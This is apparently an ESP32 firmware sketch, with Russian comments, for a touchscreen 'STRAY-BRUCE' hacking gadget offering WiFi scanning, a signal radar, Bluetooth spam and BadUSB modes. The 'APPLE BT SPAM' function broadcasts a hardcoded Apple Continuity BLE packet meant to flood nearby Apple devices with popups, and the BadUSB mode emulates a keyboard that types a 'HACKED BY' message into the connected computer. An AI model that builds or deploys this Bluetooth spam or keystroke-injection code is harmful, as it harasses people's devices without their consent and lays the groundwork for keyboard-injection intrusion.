#include "Adafruit_GFX.h"
#include "Adafruit_ILI9341.h"
#include <Wire.h>
#include <Adafruit_FT6206.h>
#include <WiFi.h>
#include <NimBLEDevice.h> 
#include "USB.h"
#include "USBHIDKeyboard.h"

// --- КОНФИГУРАЦИЯ ПИНОВ ---
#define TFT_CS 42
#define TFT_DC 40
#define TFT_RST 41
#define STRAY_YELLOW 0xFFE0 
#define STRAY_ORANGE 0xFD20

Adafruit_ILI9341 tft = Adafruit_ILI9341(TFT_CS, TFT_DC, 39, 38, TFT_RST);
Adafruit_FT6206 ts = Adafruit_FT6206();
USBHIDKeyboard Keyboard;

// Глобальные переменные
int current = 0;
int state = 0; 
const char* menu[] = {"WIFI SCAN", "RADAR", "BT SPAM", "BAD USB", "SYSTEM"};

float radarAngle = 0;
bool isSpamming = false;
NimBLEAdvertising *pAdvertising;
uint8_t apple_packet[] = { 0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xAA, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12 };

int graphX = 11;
int lastY = 180;
unsigned long lastGraphUpdate = 0;

void setup() {
  tft.begin();
  tft.setRotation(1); 
  Wire.begin(2, 1); 
  ts.begin(40);
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  USB.begin();
  drawMain();
}

// --- ЛОГИКА ВЫХОДА ---
void drawExitButton() {
  tft.fillRect(0, 190, 50, 50, ILI9341_RED); // Кнопка стала чуть больше
  tft.setTextColor(ILI9341_WHITE); tft.setTextSize(2);
  tft.setCursor(18, 205); tft.print("X");
}

bool checkExit(int tx, int ty) {
  // Зона в левом нижнем углу экрана (с запасом)
  if (tx < 70 && ty > 170) return true;
  return false;
}

// --- ПРИЛОЖЕНИЯ ---

void runScanner() {
  state = 1; tft.fillScreen(ILI9341_BLACK);
  drawExitButton();
  tft.setCursor(60, 10); tft.setTextColor(STRAY_YELLOW); tft.setTextSize(1);
  tft.println("SCANNING WIFI...");
  int n = WiFi.scanNetworks();
  for (int i = 0; i < n && i < 10; i++) {
    tft.setCursor(60, 30 + (i*15));
    tft.setTextColor(STRAY_YELLOW); tft.print(i+1); tft.print(": ");
    tft.setTextColor(ILI9341_WHITE); tft.println(WiFi.SSID(i));
  }
}

void runRadar() {
  state = 1; tft.fillScreen(ILI9341_BLACK);
  drawExitButton();
  
  while(state == 1) {
    int n = WiFi.scanNetworks();
    
    // ОЧИСТКА: Стираем старые точки черным кругом
    tft.fillCircle(160, 120, 100, ILI9341_BLACK);
    // Рисуем сетку
    tft.drawCircle(160, 120, 100, STRAY_YELLOW);
    tft.drawCircle(160, 120, 60, STRAY_YELLOW);
    tft.drawCircle(160, 120, 20, STRAY_YELLOW);
    tft.drawLine(60, 120, 260, 120, STRAY_YELLOW);
    tft.drawLine(160, 20, 160, 220, STRAY_YELLOW);

    for(int a=0; a<5; a++) {
      float oldAngle = radarAngle - 0.3;
      tft.drawLine(160, 120, 160+cos(oldAngle)*100, 120+sin(oldAngle)*100, ILI9341_BLACK);
      tft.drawLine(160, 120, 160+cos(radarAngle)*100, 120+sin(radarAngle)*100, STRAY_YELLOW);
      radarAngle += 0.3;

      for (int i = 0; i < n && i < 10; i++) {
        int d = map(WiFi.RSSI(i), -100, -30, 100, 10);
        float pAng = i * (6.28 / (n > 0 ? n : 1));
        uint16_t dotColor = (WiFi.SSID(i).indexOf("Wokwi") >= 0) ? ILI9341_RED : STRAY_YELLOW;
        tft.fillCircle(160 + cos(pAng) * d, 120 + sin(pAng) * d, 4, dotColor);
      }

      if (ts.touched()) {
        TS_Point p = ts.getPoint();
        int tx = map(p.y, 0, 320, 0, 320);
        int ty = map(p.x, 0, 240, 0, 240);
        if (checkExit(tx, ty)) { drawMain(); return; }
      }
      delay(25);
    }
  }
}

void startSpam() {
  NimBLEDevice::init("Stray-Bruce");
  pAdvertising = NimBLEDevice::getAdvertising();
  NimBLEAdvertisementData advertData;
  advertData.addData(apple_packet, sizeof(apple_packet));
  pAdvertising->setAdvertisementData(advertData);
  pAdvertising->start();
  isSpamming = true;
}

void stopSpam() {
  if (pAdvertising) pAdvertising->stop();
  NimBLEDevice::deinit(true);
  isSpamming = false;
}

void runBTSpam() {
  state = 1; tft.fillScreen(ILI9341_BLACK);
  drawExitButton();
  tft.setTextColor(STRAY_ORANGE); tft.setTextSize(2);
  tft.setCursor(60, 15); tft.println("APPLE BT SPAM");
  tft.drawFastHLine(0, 45, 320, STRAY_ORANGE);
  
  tft.setTextSize(1); tft.setCursor(60, 60); tft.print("STATUS: ");
  if (isSpamming) { tft.setTextColor(0x07E0); tft.println("ATTACKING..."); }
  else { tft.setTextColor(ILI9341_RED); tft.println("READY"); }
  
  tft.drawRect(90, 100, 150, 80, STRAY_ORANGE);
  tft.setCursor(125, 135); tft.setTextSize(2);
  tft.print(isSpamming ? "STOP" : "START");
}

void runBadUSB() {
  state = 1; tft.fillScreen(ILI9341_BLACK);
  drawExitButton();
  tft.setTextColor(STRAY_ORANGE); tft.setTextSize(2);
  tft.setCursor(60, 15); tft.println("BAD USB MODE");
  tft.drawRect(70, 100, 180, 60, STRAY_YELLOW);
  tft.setCursor(100, 125); tft.print("RUN PAYLOAD");
}

void runSystemInfo() {
  state = 1; tft.fillScreen(ILI9341_BLACK);
  drawExitButton();
  tft.setTextColor(STRAY_YELLOW); tft.setTextSize(2);
  tft.setCursor(60, 15); tft.println("SYSTEM STATUS:");
  tft.drawFastHLine(0, 45, 320, STRAY_YELLOW);
  tft.setTextSize(1);
  tft.setCursor(60, 55); tft.print("USER: STRAY_2025");
  tft.setCursor(60, 75); tft.print("CHIP: S3 N16R8 | NORILSK");
  tft.drawRect(60, 130, 250, 80, STRAY_YELLOW);
  graphX = 61;
  tft.setTextColor(0x07E0);
  tft.setCursor(60, 220); tft.println("STRAY-BRUCE OS v11.0 Clean Radar");
}

void updateGraph() {
  if (millis() - lastGraphUpdate > 50) {
    if (graphX > 300) { tft.fillRect(61, 131, 248, 78, ILI9341_BLACK); graphX = 61; }
    int val = random(140, 205);
    tft.drawLine(graphX, lastY, graphX + 2, val, 0x07E0);
    lastY = val; graphX += 2; lastGraphUpdate = millis();
  }
}

// --- ГЛАВНОЕ МЕНЮ ---

void drawMain() {
  state = 0; if (isSpamming) stopSpam();
  tft.fillScreen(ILI9341_BLACK);
  tft.fillRect(0, 0, 320, 40, STRAY_YELLOW);
  tft.setTextColor(ILI9341_BLACK); tft.setTextSize(2);
  tft.setCursor(65, 12); tft.print("STRAY-BRUCE v11.0");
  tft.drawRect(60, 85, 200, 80, STRAY_YELLOW); 
  drawMainText();
  tft.fillTriangle(15, 125, 45, 95, 45, 155, STRAY_YELLOW);   
  tft.fillTriangle(305, 125, 275, 95, 275, 155, STRAY_YELLOW); 
}

void drawMainText() {
  tft.fillRect(62, 87, 196, 76, ILI9341_BLACK);
  tft.setTextColor(STRAY_YELLOW); tft.setTextSize(2);
  int textLen = strlen(menu[current]);
  tft.setCursor(160 - (textLen * 6), 115); tft.print(menu[current]);
}

void loop() {
  if (ts.touched()) {
    TS_Point p = ts.getPoint();
    int tx = map(p.y, 0, 320, 0, 320);
    int ty = map(p.x, 0, 240, 0, 240);

    if (state == 0) { // Меню
      if (tx < 60) { current = (current > 0) ? current - 1 : 4; drawMainText(); delay(250); }
      else if (tx > 260) { current = (current + 1) % 5; drawMainText(); delay(250); }
      else if (tx > 60 && tx < 260 && ty > 80 && ty < 160) { 
        if (current == 0) runScanner(); 
        else if (current == 1) runRadar();
        else if (current == 2) runBTSpam();
        else if (current == 3) runBadUSB();
        else if (current == 4) runSystemInfo();
        delay(300); 
      }
    } 
    else if (state == 1) { // Выход
      if (checkExit(tx, ty)) { drawMain(); delay(300); }
      if (current == 2 && tx > 90 && tx < 240 && ty > 100 && ty < 180) { 
        if (!isSpamming) startSpam(); else stopSpam(); runBTSpam(); delay(400); 
      }
      if (current == 3 && tx > 70 && tx < 250 && ty > 100 && ty < 160) {
        Keyboard.println("HACKED BY STRAY-BRUCE"); delay(400);
      }
    }
  }
  if (state == 1 && current == 4) updateGraph();
}
